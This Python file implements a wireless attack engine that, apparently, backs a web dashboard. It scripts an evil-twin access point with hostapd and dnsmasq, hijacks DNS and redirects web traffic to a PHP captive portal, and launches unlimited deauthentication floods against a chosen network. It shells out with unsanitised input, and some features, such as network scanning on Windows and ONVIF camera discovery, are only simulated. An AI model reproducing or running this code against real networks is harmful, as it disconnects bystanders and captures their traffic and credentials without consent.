import threading
import subprocess
import os
import sys
import time
from datetime import datetime
import collections

# Global log buffer for Django to consume
log_buffer = collections.deque(maxlen=1000)

class WiFiPumpkinEngine:
    def __init__(self):
        self.interface = "wlan0"
        self.monitor = "wlan0mon"
        self.ssid = "Free_WiFi"
        self.channel = "6"
        self.is_running = False
        self.target_bssid = ""
        self.scanned_networks = []
        self.clients = []
        self.is_scanning = False

    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted_msg = {
            "timestamp": timestamp,
            "level": level,
            "message": msg
        }
        log_buffer.append(formatted_msg)
        print(f"[{timestamp}] {level: <7} | {msg}")

    def run_command(self, cmd):
        if sys.platform == "win32":
            self.log(f"SIMULATING: {cmd}", "DEBUG")
            time.sleep(0.5)
            return "Simulated output"
            
        try:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            if stdout: self.log(f"CMD OUT: {stdout[:100]}...", "CMD")
            if stderr: self.log(f"CMD ERR: {stderr[:100]}...", "ERROR")
            return stdout
        except Exception as e:
            self.log(f"Execution Error: {e}", "ERROR")
            return ""

    def start_attack(self):
        if self.is_running: return False
        self.is_running = True
        self.log("Initializing attack sequence...", "START")
        threading.Thread(target=self._attack_loop, daemon=True).start()
        return True

    def _attack_loop(self):
        self.run_command(f"airmon-ng start {self.interface}")
        self.run_command(f"hostapd /tmp/hostapd.conf &")
        self.run_command(f"dnsmasq -C /tmp/dnsmasq.conf &")
        self.start_evil_twin()

    def stop_attack(self):
        self.is_running = False
        self.log("Shutting down all processes...", "STOP")
        self.run_command("pkill hostapd")
        self.run_command("pkill dnsmasq")
        self.run_command("airmon-ng stop wlan0mon")
        self.run_command("iptables --flush")
        self.run_command("pkill php")
        return True

    def start_evil_twin(self):
        self.log("Deploying Evil Twin + Captive Portal...", "INFO")
        hostapd_conf = f"interface={self.monitor}\nssid={self.ssid}\nhw_mode=g\nchannel={self.channel}\n"
        with open("/tmp/hostapd.conf", "w") as f: f.write(hostapd_conf)
        
        dnsmasq_conf = f"interface={self.monitor}\ndhcp-range=192.168.69.50,192.168.69.150,12h\naddress=/#/192.168.69.1\n"
        with open("/tmp/dnsmasq.conf", "w") as f: f.write(dnsmasq_conf)
        
        self.run_command(f"ifconfig {self.monitor} 192.168.69.1 netmask 255.255.255.0")
        self.run_command("sysctl -w net.ipv4.ip_forward=1")
        self.run_command("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
        
        self.run_command("php -S 0.0.0.0:8080 -t /tmp/portal &")
        self.log(f"Evil Twin active on {self.ssid}", "SUCCESS")

    def deauth_attack(self, bssid=None):
        target = bssid or self.target_bssid
        if not target:
            self.log("No target BSSID specified", "ERROR")
            return False
        self.log(f"Launching deauth on {target}", "INFO")
        threading.Thread(target=lambda: subprocess.run(f"aireplay-ng --deauth 0 -a {target} {self.monitor}", shell=True), daemon=True).start()
        return True

    def scan_access_points(self):
        if self.is_scanning: return False
        self.is_scanning = True
        self.log("Starting network survey...", "INFO")
        
        def _scan():
            time.sleep(3)
            if sys.platform == "win32":
                self.scanned_networks = [
                    {"ssid": "Free_Coffee_WiFi", "bssid": "AA:BB:CC:DD:EE:01", "channel": "1", "signal": -45},
                    {"ssid": "Airport_Guest", "bssid": "AA:BB:CC:DD:EE:02", "channel": "6", "signal": -62},
                    {"ssid": "Corporate_Net", "bssid": "AA:BB:CC:DD:EE:03", "channel": "11", "signal": -78}
                ]
            else:
                # Real scanning logic using airodump-ng could go here
                pass
            self.is_scanning = False
            self.log(f"Survey complete. Found {len(self.scanned_networks)} networks.", "SUCCESS")
            
        threading.Thread(target=_scan, daemon=True).start()
        return True

    def get_clients(self):
        if sys.platform == "win32":
            # Simulate dynamic clients
            if self.is_running and len(self.clients) < 5:
                import random
                if random.random() > 0.7:
                    self.clients.append({
                        "mac": f"00:11:22:33:44:{random.randint(10,99)}",
                        "ip": f"192.168.69.{len(self.clients)+50}",
                        "vendor": "Apple Inc.",
                        "first_seen": datetime.now().strftime("%H:%M:%S")
                    })
        return self.clients

    def scan_onvif(self):
        self.log("Scanning for ONVIF devices...", "INFO")
        def _scan():
            time.sleep(2)
            self.log("[+] Found ONVIF Camera at 192.168.1.100", "SUCCESS")
        threading.Thread(target=_scan, daemon=True).start()
        return True

# Initialize a global engine instance
engine = WiFiPumpkinEngine()
